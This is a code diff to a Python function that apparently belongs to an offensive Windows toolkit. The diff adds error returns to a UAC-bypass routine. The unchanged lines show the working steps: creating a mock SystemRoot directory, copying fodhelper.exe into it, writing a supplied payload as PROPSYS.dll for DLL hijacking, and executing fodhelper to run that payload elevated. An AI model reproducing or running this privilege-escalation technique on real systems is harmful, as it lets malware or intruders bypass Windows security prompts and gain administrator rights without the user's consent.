@@ -32,6 +32,7 @@ def uac_mockdir(payload):
 				print_warning("Directory already exists ({path}) using existing one".format(path=d))
 			except Exception as error:
 				print_error("Unable to create mock SystemRoot directory ({error})".format(error=error))
+				return False
 			else:
 				print_success("Successfully created mock SystemRoot directory ({path})".format(path=d))
 
@@ -42,6 +43,7 @@ def uac_mockdir(payload):
 				shutil.copyfile(os.path.join(information().system_directory(), "fodhelper.exe"), os.path.join(dirs[1], "fodhelper.exe"))
 			except Exception as error:
 				print_error("Unable to copy MS binary to mock SystemRoot directory")
+				return False
 			else:
 				print_success("Successfully copied MS binary to mock SystemRoot directory")
 
@@ -49,6 +51,7 @@ def uac_mockdir(payload):
 			payload_data = open(os.path.join(payload), "rb").read()
 		except Exception:
 			print_error("Unable to read payload data")
+			return False
 
 		try:
 			dll_file = open(os.path.join(dirs[1], "PROPSYS.dll"), "wb")
@@ -56,6 +59,7 @@ def uac_mockdir(payload):
 			dll_file.close()
 		except Exception:
 			print_error("Unable to write payload to mock SystemRoot directory")
+			return False
 		else:
 			print_success("Successfully wrote payload to mock SystemRoot directory")
 
@@ -66,6 +70,7 @@ def uac_mockdir(payload):
 				print_success("Successfully executed fodhelper inside mock SystemRoot directory")
 			else:
 				print_error("Unable to execute fodhelper inside mock SystemRoot directory")
+				return False
 
 		"""
 		Cleaning cannot be done unless the process exits and dll gets unloaded
